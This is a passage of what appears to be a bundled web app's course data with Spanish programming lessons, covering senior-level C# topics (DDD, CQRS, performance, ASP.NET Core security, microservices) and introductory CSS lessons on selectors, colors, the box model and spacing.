## 3. Implementacin en C#
\`\`\`csharp
// Domain
public class Pedido { // Aggregate Root
    public int Id { get; private set; }
    private List<ItemPedido> _items = new();
    public IReadOnlyCollection<ItemPedido> Items => _items.AsReadOnly();

    public void AgregarItem(Producto producto, int cantidad) {
        // Lgica de negocio AQU, no en el servicio
        if (cantidad <= 0) throw new DomainException("Cantidad invlida");
        _items.Add(new ItemPedido(producto, cantidad));
    }
}
\`\`\`

---

### Misin Senior:
Mueve la lgica de validacin de negocio ("No se puede vender si no hay stock") DESDE los Servicios HACIA las Entidades de Dominio. Eso crea un "Rich Domain Model" en lugar de un "Anemic Domain Model".
`,completed:!1},{id:"csharp-18-patrones-diseno",title:"Patrones de Diseo Empresariales en C#",level:"senior",content:`# Leccin 18: Patrones de Diseo Empresariales en C#

Un Senior no re-inventa la rueda. Usa soluciones probadas.

## 1. Dependency Injection (DI) - Ms all de lo bsico
*   **Inyeccin de Factoras:** \`Func<T>\` o \`IFactory\` para crear objetos bajo demanda sin violar DI.
*   **Decoradores:** Usar Scrutor (librera popular) o \`AddDecorated\` para envolver servicios (Logging, Caching) sin tocar la lgica de negocio.

\`\`\`csharp
// Decorator Pattern en .NET DI
services.Decorate<IProductRepository, CachedProductRepository>();
\`\`\`

## 2. Strategy Pattern (Evitando IFs y Switches gigantes)
Cuando tienes mltiples formas de hacer algo (ej: Calcular Impuestos para 5 pases).
\`\`\`csharp
public interface ITaxStrategy {
    decimal Calcular(decimal monto);
}

// Uso: Inyectas IEnumerable<ITaxStrategy> y eliges la correcta en runtime.
\`\`\`

## 3. CQRS (Command Query Responsibility Segregation)
Separar Lecturas (Queries) de Escrituras (Commands).
*   **Comandos:** Modifican estado. Void o return ID. Validan reglas de negocio complejas.
*   **Queries:** Solo leen. Altamente optimizadas (Dapper, SQL directo). Retornan DTOs (nunca Entidades).
*   **MediatR:** La librera estndar de facto en .NET para implementar el patrn Mediator/CQRS.

---

### Misin Senior:
Usa el patrn **Options** (\`IOptions<T>\`) para inyectar configuraciones fuertemente tipadas desde \`appsettings.json\` en lugar de leer strings sueltos.
`,completed:!1},{id:"csharp-19-performance",title:"Performance Extrema (.NET Moderno)",level:"senior",content:`# Leccin 19: Performance Extrema (.NET Moderno)

Cuando el Garbage Collector (GC) se despierta, tu aplicacin se detiene (Stop-The-World). El mejor cdigo es el que no asigna memoria.

## 1. Evitando Allocations (GC Pressure)
*   **Problema:** Cada \`new String()\` o \`new List<T>()\` en un bucle caliente (Hot Path) es trabajo para el GC ms tarde.
*   **Solucin:** Reutiliza arrays \`ArrayPool<T>.Shared.Rent(100)\`. Usa \`stackalloc\` para pequeas buffers en el stack.

## 2. Span<T> y Memory<T> (Slicing sin copias)
La feature ms revolucionaria de .NET Core. Te permite ver un pedazo de un array/string sin copiarlo.
\`\`\`csharp
string texto = "http://example.com/api";
ReadOnlySpan<char> span = texto.AsSpan();
var protocolo = span.Slice(0, 4); // "http" - CERO MEMORIA ASIGNADA
\`\`\`
Antes, \`Substring()\` creaba un nuevo string. Ahora \`Slice()\` es gratis.

## 3. Estructuras (Struct vs Class)
*   **Class (Reference Type):** Vive en el Heap. Gestionada por GC.
*   **Struct (Value Type):** Vive en el Stack (generalmente). Copia por valor.
*   **\`ref struct\`:** Structs de alto rendimiento que solo viven en el stack (ej: \`Span<T>\`).

---

### Misin Senior:
Usa BenchmarkDotNet para medir tu cdigo. "Creo que esto es ms rpido" no es vlido. "BenchmarkDotNet dice que esto asigna 0 bytes vs 1KB" s lo es.
`,completed:!1},{id:"csharp-20-seguridad-avanzada",title:"Seguridad Avanzada en ASP.NET Core",level:"senior",content:`# Leccin 20: Seguridad Avanzada en ASP.NET Core

La seguridad empieza por el diseo (Security by Design). En .NET, ASP.NET Core Identity te da una base slida.

## 1. Identity & Autenticacin (JWT + OAuth 2.0)
*   **ASP.NET Core Identity:** Framework completo para gestin de usuarios, roles, claims, confirmacin de email y 2FA. Se integra con EF Core.
*   **JWT (Stateless):** El token viaja en cada request (Bearer). No se guarda sesin en el servidor.
*   \`builder.Services.AddIdentityApiEndpoints<IdentityUser>();\` (Nuevo en .NET 8).

## 2. Autorizacin (Basada en Polticas)
Olvdate de \`[Authorize(Roles="Admin")]\`. Es rgido.
Usa Polticas (\`Policies\`) basadas en Claims (\`Reclamaciones\`).
\`\`\`csharp
builder.Services.AddAuthorization(options => {
    options.AddPolicy("MayorDeEdad", policy => 
        policy.RequireClaim(ClaimTypes.DateOfBirth, minAge: 18));
});

[Authorize(Policy = "MayorDeEdad")] // Mucho ms flexible.
\`\`\`

## 3. OWASP Top 10 (Mitigaciones)
*   **SQL Injection:** EF Core con parmetros (casi imposible inyectar si usas LINQ correctamente). NUNCA concatenes strings en \`FromSqlRaw\`.
*   **XSS (Cross-Site Scripting):** ASP.NET sanitiza input por defecto en Razor/Controllers. Si usas HTML raw, usa \`HtmlEncoder\`.
*   **CORS (Cross-Origin Resource Sharing):** Configura explcitamente los orgenes permitidos. \`AllowAnyOrigin()\` es un riesgo.

---

### Misin Senior:
Encripta secretos (Connection Strings, API Keys) usando **Azure Key Vault** o **User Secrets** en dev. Nunca hardcodees contraseas en el cdigo fuente.
`,completed:!1},{id:"csharp-21-escalabilidad-microservicios",title:"Escalabilidad y Arquitectura Empresarial",level:"senior",content:`# Leccin 21: Escalabilidad y Arquitectura Empresarial

Cuando un servidor ya no alcanza, el sistema se distribuye.

## 1. Patrones de Microservicios (Lo bsico)
El Monolito bien estructurado siempre es mejor que un Monolito Distribuido.
*   **API Gateway (YARP es excelente en C#):** nico punto de entrada. Enruta, balancea y autentica.
*   **Comunicacin Async (Event-Driven):** Los servicios NO se llaman directamente (sncronos). Se envan mensajes.

## 2. Mensajera (RabbitMQ / Azure Service Bus)
*   **RabbitMQ:** Broker ligero, Open Source.
*   **Azure Service Bus:** Nube, gestionado, colas fiables.
*   **MassTransit:** Librera .NET esencial. Abstrae el Broker. No programes contra RabbitMQ directamente.

\`\`\`csharp
// MassTransit (Productor)
await _publishEndpoint.Publish<PedidoCreado>(new { PedidoId = 123 });

// Consumidor (Consumer)
public class PedidoConsumer : IConsumer<PedidoCreado> {
    public async Task Consume(ConsumeContext<PedidoCreado> context) {
        // Procesar pedido asncronamente
    }
}
\`\`\`

## 3. Cach Distribuida (Redis)
Para el estado compartido (Session State, datos lentos). \`IDistributedCache\` integrada en .NET.

---

### Misin Senior:
Implementar **Patrn Outbox** para garantizar consistencia eventual. Guardar el evento en la misma Transaccin DB que el Pedido, y luego un proceso en background (BackgroundService) lo enva al Broker.
`,completed:!1},{id:"csharp-22-practica-senior",title:"Reto de Arquitecto de Sistemas .NET",level:"senior",content:`# Prctica: Reto de Arquitecto de Sistemas .NET

Eres el lder tcnico de "CloudStore". Disea y escribe los ncleos del sistema.

---

## 1. El Core del Dominio (Clean Architecture)
**Consigna:** Implementa la lgica de \`Carrito\` usando DDD puro.
*   Entidad \`Carrito\` (Aggregate Root).
*   Value Object \`Moneda\` (inmutable, valida ISO codes, suma segura).
*   Reglas:
    *   No se pueden agregar tems con precio 0.
    *   Si el total supera $1000, aplica descuento del 10%.
    *   Debe lanzar \`DomainException\` especficas.
*   **Bonus:** Unit Tests con xUnit para validar la lgica pura.

## 2. El Pipeline de MediatR (CQRS)
**Consigna:** Crea el flujo para "Crear Pedido".
*   \`CreateOrderCommand\` (DTO inmutable).
*   \`CreateOrderHandler\` (Lgica de aplicacin).
*   Usa un \`IPipelineBehavior\` (decorador de MediatR) para loguear automticamente el tiempo de ejecucin de cada comando.

## 3. Optimizador de Memoria (Performance)
**Consigna:** Tienes un archivo CSV gigante (simulado) de Strings.
*   Escribe un mtodo que parsee una lnea \`id,nombre,precio\` usando \`ReadOnlySpan<char>\` y \`Memory<T>\` para **NO generar strings intermedios** (Zero Allocation Parsing).
*   Compara con \`string.Split()\` usando BenchmarkDotNet (opcional, terico).

---

### Entregable Esperado:
Una solucin modular (\`CloudStore.Domain\`, \`CloudStore.Application\`, \`CloudStore.Infrastructure\`) donde la dependencia fluya hacia adentro. Cdigo limpio, testeable y performante.
`,completed:!1,isProject:!0},{id:"csharp-23-roadmap-csharp",title:"Roadmap C# - El Ecosistema .NET",level:"senior",content:`# Leccin 23: Roadmap C# - El Ecosistema .NET

.NET es enorme. No intentes aprenderlo todo a la vez. Elige tu camino.

## Camino 1: Backend Enterprise (El estndar)
*   **Junior:** C# Sintaxis, LINQ, SQL Server, APIs bsicas con Controllers.
*   **Semi-Senior:** Entity Framework Core, Dependency Injection, Async/Await, Unit Testing.
*   **Senior:** Microservicios, Docker/Kubernetes, Azure/AWS, Clean Architecture, CQRS, Redis, RabbitMQ.
*   **Frameworks:** ASP.NET Core, SignalR (WebSockets).

## Camino 2: Desktop & Mobile (Cross-Platform)
*   **Tecnologa:** .NET MAUI (Multi-platform App UI) o Avalonia UI.
*   **Objetivo:** Crear una sola app que corra en Windows, Mac, Android y iOS.
*   **Skills:** XAML (Lenguaje de UI), MVVM (Patrn de diseo), DataBinding.
*   **Legacy:** WPF (Windows Presentation Foundation) y WinForms siguen muy vivos en la industria bancaria/industrial.

## Camino 3: Game Development (Unity/Godot)
*   **Motor:** Unity es el motor de videojuegos ms popular del mundo y usa C#. Godot tambin tiene soporte C#.
*   **Skills:** Matemticas (Vectores, Quaterniones), Fsica, Shaders, Optimizacin de memoria (GC es el enemigo aqu).
*   **Diferencia:** En juegos, el patrn "Component" reemplaza a la herencia profunda.

---

### Tu misin ahora:
Elige un proyecto real.
1.  **Backend:** Un clon de Twitter (API Rest + Realtime notifications).
2.  **Desktop:** Un gestor de finanzas personales (SQLite local).
3.  **Juego:** Un clon de Flappy Bird.

Bienvenido a la comunidad .NET!
`,completed:!1}]},p1={id:"css",title:"CSS3: Estilos y Diseo",description:"Aprende a dar vida a tus pginas web con CSS. Desde colores y fuentes hasta diseos complejos y animaciones.",completed:!1,lessons:[{id:"css-junior-que-es-css",title:"Qu es CSS y cmo funciona la magia?",level:"junior",content:`# Leccin 1: Qu es CSS y cmo funciona la magia?



## 1. El diseador de la web



Si HTML es el esqueleto de tu sitio web (huesos, estructura), **CSS** (Cascading Style Sheets) es la piel, la ropa y el maquillaje.

Sin CSS, todas las webs se veran aburridas, en blanco y negro, como un documento de Word mal hecho.



## 2. Anatoma de una regla CSS



CSS funciona dando "rdenes" a los elementos HTML.

Una regla CSS se ve as:



\`\`\`css

h1 {

    color: red;

    font-size: 20px;

}

\`\`\`



Vamos a desarmarla:

*   **Selector (\`h1\`)**: "A quin quiero cambiar?" (En este caso, a todos los ttulos h1).

*   **Propiedad (\`color\`, \`font-size\`)**: "Qu quiero cambiar?" (El color del texto, el tamao de la letra).

*   **Valor (\`red\`, \`20px\`)**: "Cmo quiero que se vea?" (Rojo, de 20 pxeles).



## 3. La "Cascada" (Cascading)



CSS significa "Hojas de Estilo en Cascada". Por qu cascada?

Porque las reglas caen de arriba a abajo. Si escribes dos reglas contradictorias para el mismo elemento, **ganar la ltima que escribiste**.



\`\`\`css

p {

    color: blue;

}



/* Esta regla sobreescribe a la anterior porque est despus */

p {

    color: green;

}

\`\`\`

*Resultado: Los prrafos sern verdes.*



## 4. Ejercicio Mental

Imagina que eres un decorador.

HTML te dice: "Aqu hay una pared".

CSS le dice: "Pinta esa pared de azul, ponle un cuadro en el centro y haz que brille cuando la toques".



## 5. Prctica Rpida

Crea un archivo \`.html\` simple y piensa qu te gustara cambiar. El color de fondo? El tipo de letra? CSS puede hacer todo eso.

`,completed:!1},{id:"css-junior-formas-aplicar-css",title:"Formas de aplicar CSS",level:"junior",content:`# Leccin 2: Formas de aplicar CSS



## 1. Las tres formas de conectar CSS



Existen tres maneras de decirle al navegador "Oye, usa estos estilos". Algunas son buenas para pruebas rpidas, pero solo una es la profesional.



## 2. Estilos en Lnea (Inline Styles) - *No recomendado*



Escribes CSS directamente dentro de la etiqueta HTML usando el atributo \`style\`.



\`\`\`html

<h1 style="color: blue; font-size: 30px;">Hola Mundo</h1>

\`\`\`



*   **Ventaja:** Rpido para probar algo puntual.

*   **Desventaja:** Ensucia el HTML. Si quieres cambiar el color de 50 ttulos, tendrs que editar 50 lneas. **Evtalo en proyectos reales.**



## 3. Estilos Internos (Internal Styles) - *Para una sola pgina*



Escribes CSS dentro de la etiqueta \`<style>\` en el \`<head>\` de tu archivo HTML.



\`\`\`html

<head>

    <style>

        h1 {

            color: red;

        }

        p {

            font-family: Arial;

        }

    </style>

</head>

\`\`\`



*   **Ventaja:** Todo est en un solo archivo.

*   **Desventaja:** Si tienes 10 pginas web, tendrs que copiar y pegar esos estilos en las 10 pginas. Si cambias algo, dolor de cabeza asegurado.



## 4. Estilos Externos (External Styles) - *La forma profesional!*



Creas un archivo separado con extensin \`.css\` (ej: \`estilos.css\`) y lo enlazas en tu HTML.



**En tu archivo \`estilos.css\`:**

\`\`\`css

body {

    background-color: #f0f0f0;

}

h1 {

    color: green;

}

\`\`\`



**En tu archivo \`index.html\`:**

\`\`\`html

<head>

    <!-- Esta lnea mgica conecta los archivos -->

    <link rel="stylesheet" href="estilos.css">

</head>

\`\`\`



*   **Ventaja Suprema:** Puedes cambiar el diseo de **todo tu sitio web** editando un solo archivo CSS. El navegador guarda el archivo en cach, as que carga ms rpido.



## 5. Ejercicio Prctico

1.  Crea un archivo \`index.html\`.

2.  Crea un archivo \`style.css\`.

3.  Conctalos usando \`<link>\`.

4.  Escribe en el CSS: \`body { background-color: pink; }\`.

5.  Si el fondo de tu pgina se pone rosa, felicidades! Has conectado tu primer CSS externo.

`,completed:!1},{id:"css-junior-selectores-basicos",title:'Selectores Bsicos - "Apuntando al objetivo"',level:"junior",content:`# Leccin 3: Selectores Bsicos - "Apuntando al objetivo"



## 1. El Francotirador del CSS



Para aplicar estilos, primero debes saber "apuntar" al elemento correcto. Los selectores son la mira de tu arma de estilos.



## 2. Selector de Etiqueta (Tag Selector)



Afecta a **todas** las etiquetas de ese tipo.



\`\`\`css

/* Todos los prrafos sern grises */

p {

    color: gray;

}

\`\`\`



## 3. Selector de Clase (Class Selector) - *.hago-esto*



El ms usado por los profesionales. Afecta a cualquier elemento que tenga el atributo \`class="..."\`. Se escribe con un punto \`.\` antes del nombre.



**HTML:**

\`\`\`html

<p class="destacado">Este texto es importante</p>

<p>Este es normal</p>

<button class="destacado">Botn importante</button>

\`\`\`



**CSS:**

\`\`\`css

/* Solo los elementos con class="destacado" se ven as */

.destacado {

    background-color: yellow;

    font-weight: bold;

}

\`\`\`



## 4. Selector de ID (ID Selector) - *#unico*



Afecta a **UN SOLO** elemento especfico. Se escribe con un numeral \`#\`.

Recuerda: Los IDs no deben repetirse en la misma pgina.



**HTML:**

\`\`\`html

<div id="cabecera-principal">...</div>

\`\`\`



**CSS:**

\`\`\`css

#cabecera-principal {

    background-color: black;

    color: white;

}

\`\`\`



*Nota:* Evita usar IDs para estilos si puedes usar clases. Los IDs tienen una "especificidad" muy alta y son difciles de sobreescribir despus.



## 5. Selector Universal (*)



Afecta a **TODO**.



\`\`\`css

* {

    margin: 0;

    padding: 0;

}

\`\`\`

*Se usa mucho para "resetear" los estilos por defecto del navegador.*



## 6. Agrupando Selectores



Si quieres aplicar lo mismo a varias cosas, sepralas por coma.



\`\`\`css

h1, h2, h3 {

    font-family: 'Helvetica', sans-serif;

    color: #333;

}

\`\`\`



## 7. Reto Rpido

1.  Crea tres prrafos.

2.  Al primero ponle una clase \`.rojo\`.

3.  Al segundo ponle un id \`#unico-azul\`.

4.  Al tercero no le pongas nada.

5.  Usa CSS para que el primero sea rojo, el segundo azul y el tercero... verde (usando el selector de etiqueta \`p\`)!

Qu pas con los dos primeros? (Pista: Las clases y IDs tienen prioridad sobre la etiqueta).

`,completed:!1},{id:"css-junior-colores-unidades",title:"Colores y Unidades",level:"junior",content:`# Leccin 4: Colores y Unidades



## 1. Pintando la web (Colores)



CSS te permite definir colores de muchas formas. Las 3 ms comunes son:



### Palabras Clave (Keywords)

Nombres en ingls. Son limitados (aprox 140).

\`color: red;\`

\`background-color: lightblue;\`



### Hexadecimal (Hex)

El mtodo ms clsico. Un cdigo de 6 caracteres que empieza con \`#\`.

\`color: #ff0000;\` (Rojo)

\`color: #000000;\` (Negro)

\`color: #ffffff;\` (Blanco)

*Tip: Casi todos los editores de cdigo (como VS Code) te muestran un selector de color si pasas el mouse por encima.*



### RGB y RGBA

Red, Green, Blue. Valores del 0 al 255.

\`color: rgb(255, 0, 0);\` (Rojo)

**RGBA** agrega "Alpha" (Transparencia). El ltimo nmero va de 0 (invisible) a 1 (slido).

\`background-color: rgba(0, 0, 0, 0.5);\` (Negro semitransparente).



## 2. Midiendo cosas (Unidades)



En HTML no usbamos unidades, pero en CSS son obligatorias. \`width: 50\` no funciona. Debe ser \`width: 50px\`.



### Unidades Absolutas

*   **px (Pxeles):** La ms comn. Un punto en la pantalla. \`font-size: 16px;\`. Es precisa pero no escala si el usuario cambia el tamao de fuente del navegador.



### Unidades Relativas (Las favoritas del diseo responsivo!)

*   **% (Porcentaje):** Relativo al padre.

    Si mi contenedor mide 1000px y yo digo \`width: 50%\`, medir 500px.

    

*   **rem (Root EM):** Relativo al tamao de letra base del navegador (generalmente 16px).

    \`1rem\` = 16px.

    \`2rem\` = 32px.

    \`1.5rem\` = 24px.

    *Esta es la unidad estndar moderna para textos y mrgenes.*



*   **em:** Relativo al tamao de letra de SU PADRE directo. Puede ser confuso (efecto bola de nieve), por eso se prefiere \`rem\`.



*   **vw / vh (Viewport Width / Height):** Relativo al tamao de la ventana del navegador.

    \`height: 100vh\` = Ocupa el 100% de la altura visible de la pantalla. Ideal para secciones de "Hero" (portadas).



## 3. Ejercicio de Colores

Juega con \`rgba\`. Intenta poner un fondo de imagen y encima un texto con un fondo negro semitransparente (\`rgba(0,0,0,0.7)\`) y letras blancas. Vers qu profesional queda!

`,completed:!1},{id:"css-junior-tipografias-texto",title:"Tipografas y Texto",level:"junior",content:`# Leccin 5: Tipografas y Texto



## 1. Ms all de Times New Roman



El texto es el 90% de la web. CSS te da control total sobre cmo se lee.



## 2. Propiedades fundamentales



*   **\`font-family\`**: La fuente.

    \`\`\`css

    body {

        font-family: 'Arial', sans-serif;

    }

    \`\`\`

    *Siempre pon una "familia genrica" al final (\`sans-serif\`, \`serif\`, \`monospace\`) por si la fuente principal falla.*



*   **\`font-size\`**: El tamao.

    \`\`\`css

    p {

        font-size: 1rem; /* aprox 16px */

    }

    \`\`\`



*   **\`font-weight\`**: El grosor (negrita).

    Valores: \`normal\` (400), \`bold\` (700) o nmeros especficos.

    \`\`\`css

    strong {

        font-weight: 700;

    }

    \`\`\`



*   **\`color\`**: El color del texto.

    \`\`\`css

    h1 {

        color: #333;

    }

    \`\`\`



*   **\`text-align\`**: Alineacin.

    Valores: \`left\`, \`center\`, \`right\`, \`justify\`.

    \`\`\`css

    h1 {

        text-align: center;

    }

    \`\`\`



*   **\`line-height\`**: Altura de lnea (espacio entre renglones).

    Vital para la legibilidad. Un valor de \`1.5\` o \`1.6\` suele ser perfecto para prrafos.

    \`\`\`css

    p {

        line-height: 1.6; 

    }

    \`\`\`



*   **\`text-decoration\`**: Decoraciones (subrayado).

    Los enlaces vienen subrayados por defecto. Para quitarlo:

    \`\`\`css

    a {

        text-decoration: none;

    }

    \`\`\`



## 3. Importando Google Fonts



No te limites a las fuentes instaladas en la PC.



1.  Ve a [fonts.google.com](https://fonts.google.com).

2.  Elige una fuente (ej: "Roboto").

3.  Copia el cdigo \`<link>\` que te dan y pgalo en tu \`<head>\` HTML.

4.   sala en tu CSS: \`font-family: 'Roboto', sans-serif;\`.



## 4. Ejercicio de Tipgrafo

Crea una noticia falsa.

1.  Usa una fuente \`serif\` (como Times New Roman o Merriweather) para el cuerpo del texto para que parezca un peridico serio.

2.  Usa una fuente \`sans-serif\` (como Arial o Roboto) oscura y gruesa (\`900\`) para el titular.

3.  Asegura que el texto tenga buen \`line-height\` para que no canse la vista.

`,completed:!1},{id:"css-junior-box-model",title:"El Box Model (Modelo de Caja) - VITAL!",level:"junior",content:`# Leccin 6: El Box Model (Modelo de Caja) - VITAL!



## 1. Todo son cajas



Esta es la leccin **ms importante** de CSS. Si entiendes esto, entiendes el diseo web.

**CADA elemento HTML es una caja rectangular.** Incluso un texto redondo o una imagen circular viven dentro de una caja rectangular invisible.



## 2. Las capas de la cebolla (De adentro hacia afuera)



Imagina un cuadro colgado en la pared.



1.  **Content (Contenido):** La pintura en s (el texto, la imagen). Su tamao se define con \`width\` y \`height\`.

2.  **Padding (Relleno):** El espacio blanco entre la pintura y el marco. Es espacio **interno**. Si el cuadro tiene fondo de color, el padding tambin se pinta de ese color.

3.  **Border (Borde):** El marco del cuadro. Va alrededor del padding.

4.  **Margin (Margen):** El espacio entre este cuadro y el cuadro de al lado. Es espacio **externo** e invisible (nadie puede entrar ah).



## 3. Visualizndolo en CSS



\`\`\`css

div {

    width: 200px;         /* 1. Contenido */

    padding: 20px;        /* 2. Relleno interno */

    border: 5px solid black; /* 3. Borde */

    margin: 50px;         /* 4. Espacio externo */

}

\`\`\`



## 4. El problema matemtico (y la solucin \`box-sizing\`)



Por defecto, si dices \`width: 200px\` y \`padding: 20px\`, el navegador hace esto:

200px (ancho) + 20px (padding izq) + 20px (padding der) = **240px** de ancho total.

Esto rompe los diseos!



**La Solucin Profesional:**

Siempre, en todos tus proyectos, usa esto al principio del CSS:



\`\`\`css

* {

    box-sizing: border-box;

}

\`\`\`



Con \`border-box\`, si dices \`width: 200px\`, la caja medir 200px TOTALES. El navegador restar el padding y el borde automticamente del contenido para que cuadre todo. **Es tu mejor amigo.**



## 5. Ejercicio

Abre las herramientas de desarrollador de tu navegador (F12 o Click derecho -> Inspeccionar).

Ve a la pestaa "Computed" o "Estilos" y busca el diagrama de la caja de colores. Pasa el mouse por encima para ver cunto mide el margen, el borde y el padding de los elementos de tu pgina favorita.

`,completed:!1},{id:"css-junior-display-visibility",title:"Display y Visibilidad",level:"junior",content:`# Leccin 7: Display y Visibilidad



## 1. El comportamiento de las cajas



No todas las cajas se comportan igual. La propiedad \`display\` controla cmo se sienta un elemento en la mesa junto a los otros.



## 2. \`display: block\` (Bloque)

*   Son egostas: Ocupan **todo el ancho** disponible.

*   Empiezan en una lnea nueva.

*   Ejemplos naturales: \`<div>\`, \`<h1>\`, \`<p>\`, \`<section>\`.

*   *Puedes ponerles ancho y alto.*



\`\`\`css

.caja {

    display: block; /* Se apilan uno debajo del otro */

}

\`\`\`



## 3. \`display: inline\` (En lnea)

*   Son sociales: Solo ocupan el **ancho de su contenido**.

*   Se sientan lado a lado con otros elementos.

*   **No** aceptan \`width\`, \`height\`, \`margin-top\` ni \`margin-bottom\`.

*   Ejemplos naturales: \`<span>\`, \`<a>\`, \`<strong>\`.



## 4. \`display: inline-block\` (Hbrido)

*   Lo mejor de los dos mundos.

*   Se sientan lado a lado (como inline).

*   PERO aceptan ancho, alto y mrgenes (como block).

*   *Ideal para botones o tarjetas en cuadrcula simple.*



## 5. \`display: none\` vs \`visibility: hidden\`



Cmo escondo algo?



*   **\`display: none\`**: Desaparece! El elemento se borra visualmente y **deja de ocupar espacio**. Los elementos de abajo suben a ocupar su lugar.

*   **\`visibility: hidden\`**: Se vuelve invisible, pero **sigue ocupando su espacio**. Queda un hueco vaco.



## 6. Ejercicio de Navegacin

Los enlaces \`<a>\` son \`inline\` por defecto (no puedes darles padding vertical cmodamente).

Convierte una lista de enlaces en botones:

\`\`\`css

a {

    display: inline-block; /* Ahora s aceptan padding */

    padding: 10px 20px;

    background: blue;

    color: white;

}

\`\`\`

Observa la diferencia si cambias a \`display: block\` (se podr uno debajo del otro).

`,completed:!1},{id:"css-junior-margin-padding",title:"Margin y Padding (Espaciado)",level:"junior",content:`# Leccin 8: Margin y Padding (Espaciado)



## 1. Cul uso?



Ya vimos qu son en el Box Model, pero cundo usar cul?



*   **Padding (Relleno):**  salo cuando quieres espacio **dentro** del borde. Ejemplo: Quieres que el texto de un botn no toque los bordes del botn.

*   **Margin (Margen):**  salo cuando quieres separar elementos **entre s**. Ejemplo: Quieres espacio entre dos botones o entre una imagen y un texto.



## 2. La notacin del reloj



Tanto margin como padding pueden escribirse de forma resumida (shorthand). El orden sigue las agujas del reloj: **Top (Arriba), Right (Derecha), Bottom (Abajo), Left (Izquierda)**.



**4 valores:**

\`\`\`css

/* Arriba Derecha Abajo Izquierda */

padding: 10px 20px 15px 5px;

\`\`\`



**2 valores (Muy comn):**

\`\`\`css

/* Vertical (Arr/Abj) - Horizontal (Izq/Der) */

margin: 20px 50px;

\`\`\`

*Arriba y abajo tienen 20px. Izquierda y derecha tienen 50px.*



**1 valor:**

\`\`\`css

padding: 10px; /* Todos los lados iguales */

\`\`\`



## 3. Centrar horizontalmente con Margin



El truco ms viejo del libro para centrar un bloque (que tenga un ancho definido):



\`\`\`css

.caja-centrada {

    width: 500px;

    margin-left: auto;

    margin-right: auto;

    /* O ms corto: */

    margin: 0 auto;

}

\`\`\`

*\`auto\` le dice al navegador: "Reparte el espacio sobrante equitativamente a los lados".*



## 4. Colapso de Mrgenes (Margin Collapse)

Un fenmeno extrao: Si tienes un elemento con \`margin-bottom: 20px\` y debajo otro con \`margin-top: 30px\`, el espacio entre ellos NO ser 50px. Ser **30px**.

Los mrgenes verticales se solapan (gana el mayor), no se suman.

*Nota: Esto no pasa con paddings ni con mrgenes horizontales.*

`,completed:!1},{id:"css-junior-bordes-sombras",title:"Bordes y Sombras",level:"junior",content:`# Leccin 9: Bordes y Sombras



## 1. Bordes (\`border\`)



Para definir un borde necesitas 3 cosas: Grosor, Estilo y Color.



\`\`\`css

/* Forma larga */

border-width: 2px;

border-style: solid; /* solid, dashed, dotted, double */

border-color: red;



/* Forma corta (Recomendada) */

border: 2px solid red;

\`\`\`



Tambin puedes poner bordes solo en un lado:

\`border-bottom: 1px solid gray;\` (Muy usado para subrayados o separar secciones).



### Bordes Redondeados (\`border-radius\`)

Para suavizar las esquinas!



\`\`\`css

.caja {

    border-radius: 10px;

}

\`\`\`



*Truco:* Para hacer un crculo perfecto, asegrate de que el elemento sea cuadrado (width = height) y pon \`border-radius: 50%\`.



## 2. Sombras (\`box-shadow\`)



Las sombras dan profundidad (efecto 3D) y hacen que los elementos "salgan" de la pantalla.



Sintaxis:

\`box-shadow: offset-x offset-y blur spread color;\`



\`\`\`css

.tarjeta {

    /* Derecha 5px, Abajo 5px, Difuminado 10px, Color negro semitransparente */

    box-shadow: 5px 5px 10px rgba(0,0,0,0.3);

}

\`\`\`



*   **Offset-x**: Positivo mueve la sombra a la derecha.

*   **Offset-y**: Positivo mueve la sombra abajo.

*   **Blur**: Qu tan borrosa es la sombra. 0 es totalmente ntida y dura.

*   **Color**: Usa siempre \`rgba\` con opacidad baja (0.1 a 0.5) para que se vea natural. Las sombras negras slidas (\`#000\`) se ven muy duras y amateurs.



## 3. Ejercicio de Diseo "Material"

Crea un botn que parezca flotar.

1.  Ponle un color de fondo azul y texto blanco.

2.  Qutale el borde (\`border: none\`).

3.  Dale padding generoso.

4.  Agrega un \`border-radius: 4px\`.

5.  Agrega una sombra suave: \`box-shadow: 0 4px 6px rgba(0,0,0,0.1)\`.

6.  Mira qu diferencia con un botn normal!

`,completed:!1},{id:"css-junior-buenas-practicas-css",title:"Buenas Prcticas Bsicas de CSS",level:"junior",content:`# Leccin 10: Buenas Prcticas Bsicas de CSS



## 1. Mantn tu cdigo limpio



CSS puede volverse un espagueti gigante muy rpido. Sigue estas reglas desde el da 1.



## 2. No uses \`!important\`

Es una bomba atmica. \`!important\` fuerza una regla sobre todas las dems.

Si abusas de esto, luego ser imposible sobreescribir tus propios estilos sin aadir M S \`!important\`.  salo solo en casos de vida o muerte (o para sobreescribir libreras externas rebeldes).



## 3. Evita nombres genricos

No llames a tus clases \`.caja\`, \`.texto\`, \`.rojo\`.

Usa nombres semnticos que describan **qu es** o **para qu sirve**.



*   Mal: \`.grande\` (Qu pasa si maana el diseo cambia y ya no es grande?)

*   Bien: \`.titulo-principal\` o \`.tarjeta-producto\`.



## 4. Agrupa tus estilos

No escribas reglas al azar. Intenta mantener un orden lgico en tu archivo CSS.



\`\`\`css

/* === GENERAL === */

body { ... }

h1, h2 { ... }



/* === HEADER === */

header { ... }

.logo { ... }



/* === PRODUCTOS === */

.tarjeta { ... }

.precio { ... }

\`\`\`



## 5. Usa clases en lugar de IDs

Como vimos, las clases \`.clase\` son reutilizables y tienen una especificidad baja (fcil de manejar). Los IDs \`#id\` son nicos y difciles de sobreescribir. Reserva los IDs para JavaScript o anclas.



## 6. CSS Reset / Normalize

Los navegadores traen estilos por defecto (mrgenes en el body, paddings en listas).

Siempre empieza tus proyectos reseteando lo bsico para que se vea igual en Chrome, Firefox y Safari.



Un reset minimalista moderno:



\`\`\`css

* {

    box-sizing: border-box;

    margin: 0;

    padding: 0;

}



body {

    line-height: 1.5;

    font-family: sans-serif;

}



img {

    max-width: 100%; /* Para que no se salgan del mvil */

    display: block;

}

\`\`\`



## 7. Reto Final del Nivel Junior

Crea una "Landing Page" simple que tenga:

1.  Un reset CSS al inicio.

2.  Un encabezado con fondo de color y texto centrado.

3.  Tres tarjetas de servicios alineadas (usa \`inline-block\` por ahora).

4.  Cada tarjeta debe tener borde redondeado, una sombra suave y cambiar de color al pasar el mouse (investiga la pseudo-clase \`:hover\`, ej: \`.tarjeta:hover { ... }\`).

`,completed:!1},{id:"css-junior-ejercicios",title:"Ejercicios Prcticos: CSS Junior",level:"junior",content:`# Ejercicios Prcticos: CSS Junior



Pon a prueba tus habilidades de estilizado.

Para cada ejercicio, crea un archivo \`index.html\` y un \`style.css\`.



---



## 1. Mi Pgina de Perfil (Profile Card)

